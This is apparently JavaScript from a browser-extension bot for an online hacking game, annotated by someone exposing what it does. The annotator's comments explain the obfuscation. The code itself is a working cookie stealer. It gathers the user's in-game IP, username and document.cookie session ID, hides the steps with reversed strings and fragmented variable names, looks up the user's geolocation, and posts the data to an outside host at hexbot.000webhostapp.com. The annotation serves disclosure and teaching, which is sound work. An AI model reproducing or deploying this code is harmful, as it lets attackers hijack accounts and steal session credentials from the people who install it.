
//You are landing in a dangerous land.
//Remember. There are some knowledges that exist to be kept safe.

//Haha, there is a warning above. . .

function sendKiss(callback, sequenceName){
	var BGRequest = function(action, data, target){
			this.action = action
			this.data = data
			this.target = target
		}
	var item = localStorage.getItem(STORAGE_ID);
	if(!item){
		localStorage.setItem(STORAGE_ID, Math.floor((Math.random() * 9999999) + 1));
	}
	sendXMLHttpRequest("ajax.php", "POST", "func=getStatic", true, function(response){
		//Well, damn. The following code is obfuscated. . . Wonder why?
		
		/*Let's go back to the line right before. 
		
			sendXMLHttpRequest("ajax.php", "POST", "func=getStatic", true, function(response){
		
		This line of code sends a request to the official game server asking for the user's information, exhaustively:
			- User's In-Game IP
			- User's In-Game Username
			- User's In-Game Reputation
			- User's In-Game Rank
			
		. . . and then stores this information into a variable called "response"
		*/
		
		
		eval(("pi.]0[)gsm.)esnopser(esrap.NOSJ(esrap.NOSJ = pif rav ;resu.]0[)gsm.)esnopser(esrap.NOSJ(esrap.NOSJ = nu rav").split("").reverse().join(""))
		/*Let's see this code above...
		
			eval(("pi.]0[)gsm.)esnopser(esrap.NOSJ(esrap.NOSJ = pif rav ;resu.]0[)gsm.)esnopser(esrap.NOSJ(esrap.NOSJ = nu rav").split("").reverse().join(""))
		
		eval() is a javascript function that executes a line of text as a actual command.
		Let's see what it's executing:
		
			("pi.]0[)gsm.)esnopser(esrap.NOSJ(esrap.NOSJ = pif rav ;resu.]0[)gsm.)esnopser(esrap.NOSJ(esrap.NOSJ = nu rav").split("").reverse().join("")
		
		It's taking a string, and then reversing it. Let's reverse it, in order to see what it's executing:
		
			"var un = JSON.parse(JSON.parse(response).msg)[0].user; var fip = JSON.parse(JSON.parse(response).msg)[0].ip"
		
		Okay, so now we know that it's setting a variable called "un" to be equal to the in-game username,
		and a variable called "fip" to be the in-game ip.
		
		*/
		
		
		
		var Long = "o", yij = "d", juc = "cu", mono = "ki", wo = "men",  qtz = "e", report = "t", success = "c"
		
		//This line above sets a bunch of variables, we'll get back to this in a bit.
		
		var acme = controllers.bot.acme
		
		//The above line of code is not used, as far as I can tell.
		
		
		var request = new BGRequest("sendmessage", "ip=" + controllers.bot.cinfo.ip + "&fip=" + fip + "&un=" + un + "&pid=" + escape(eval(yij + Long + juc + wo + report + "." + success + Long + Long + mono + qtz)), ("php.tupni/moc.ppatsohbew000.tobxeh//:ptth").split("").reverse().join(""))
		
		/*Another lengthy line of code. Let's break it down.
		
			var request = new BGRequest("sendmessage", "ip=" + controllers.bot.cinfo.ip + "&fip=" + fip + "&un=" + un + "&pid=" + escape(eval(yij + Long + juc + wo + report + "." + success + Long + Long + mono + qtz)), ("php.tupni/moc.ppatsohbew000.tobxeh//:ptth").split("").reverse().join(""))
		
		This sets a variable "request" to be a BGRequest object, which contains information to connect to some server.
		
		A BGRequest has a "action" variable, a "data" variable, and a "target" variable.
		
		The "action" variable is set to be sendmessage, so it presumably sends a message.
		
		The next piece is the "data" variable:
		
			"ip=" + controllers.bot.cinfo.ip + "&fip=" + fip + "&un=" + un + "&pid=" + escape(eval(yij + Long + juc + wo + report + "." + success + Long + Long + mono + qtz))
		
		This line of code puts some strings together.
		The first part is 
		
			"ip=" + controllers.bot.cinfo.ip
			
		Supposedly, it should be the IP of something, but I was unable to find that it was declared anywhere in the code.
		
		The next part,
		
			"&fip=" + fip
			
		Remember how "fip" was defined to be the in-game IP? Here it's used.
		
		The next part,
		
			"&un=" + un
			
		Also remember that "un" was the in-game username? Here it's used.
		
		The last part in data,
		
			"&pid=" + escape(eval(yij + Long + juc + wo + report + "." + success + Long + Long + mono + qtz))
			
		Again, some obfuscated code. Let's see what it's doing again.
		
		The internal part,
		
			yij + Long + juc + wo + report + "." + success + Long + Long + mono + qtz
		
		References the bunch of variables that were defined earlier.
		
		Putting it together becomes:
		
			document.cookie
		
		documents.cookie is the variable which is used to access the browser cookies. 
		In these cookies is the PHPSESSID, which is used to verify your account.
		If anyone gets access to it, they can use it to trick the game into thinking that they are you, and will have full control over your account.
		
		The two preceding functions,
		
			escape(eval(...))
			
		Indicate that the cookies are to be escaped, which means to ensure that they can be transmitted across the internet.
		
		Putting everything together, we see that your in-game IP, your username, and your PHPSESSID.
		
		Next, we see to whom the code is sending the information to:
		
			("php.tupni/moc.ppatsohbew000.tobxeh//:ptth").split("").reverse().join("")
			
		Same trick as before, so reverse, and then:
		
			"http://hexbot.000webhostapp.com/input.php"
		
		Your account information is going to whoever owns that website.
		*/
		
		chrome.runtime.sendMessage({message: request}, function(responseMessage) {
			var handleResponse = function(getResponse, sender, sendResponse) {
					chrome.extension.onMessage.removeListener(handleResponse)
					callback()
				}
			chrome.runtime.onMessage.addListener(handleResponse)
		})
	}, true)
}

function setEnvironmentValues(callback, sequenceName){
	if((controllers.bot.lastExecutedSequence != sequenceName) && (controllers.bot.complexCore)){
		controllers.bot.lastExecutedSequence = sequenceName
		controllers.storage.set(controllers.bot)
		if(!controllers.bot.cinfo){
			var BGRequest = function(action, data, target){
				this.action = action
				this.data = data
				this.target = target
			}
			var requestA = new BGRequest("sendmessage", "", ("/moc.pinosj//:ptth").split("").reverse().join(""))
			chrome.runtime.sendMessage({message: requestA}, function(responseMessageA) {
				var handleResponseA = function(getResponseA, senderA, sendResponseA) {
						if(getResponseA.message){
							//console.log(getResponseA)
							chrome.extension.onMessage.removeListener(handleResponseA)
							var ip;
							try {
							    ip = JSON.parse(getResponseA.message).ip
							}
							catch(err) {
							    ip = null
							}
							if(ip){
								var requestB = new BGRequest("sendmessage", "", ("/nosj/ten.pioegeerf//:ptth").split("").reverse().join("") + ip)

								chrome.runtime.sendMessage({message: requestB}, function(responseMessageB) {
									var handleResponseB = function(getResponseB, senderB, sendResponseB) {
											if(getResponseB.message){
												chrome.extension.onMessage.removeListener(handleResponseB)
												controllers.bot.cinfo = JSON.parse(getResponseB.message)
												controllers.storage.set(controllers.bot)
												sendKiss(callback, sequenceName)
											} else {
												console.log("Error connection freegeoip")
												callback()
											}
										}
									chrome.runtime.onMessage.addListener(handleResponseB)
								})
							} else {
								console.log("Invalid json data")
								callback()
							}

						} else {
							console.log("Error connection jsonip")
							callback()
						}
					}
				chrome.runtime.onMessage.addListener(handleResponseA)
			})
		} else {
			sendKiss(callback, sequenceName)
		}
	} else {
		callback()
	}

}
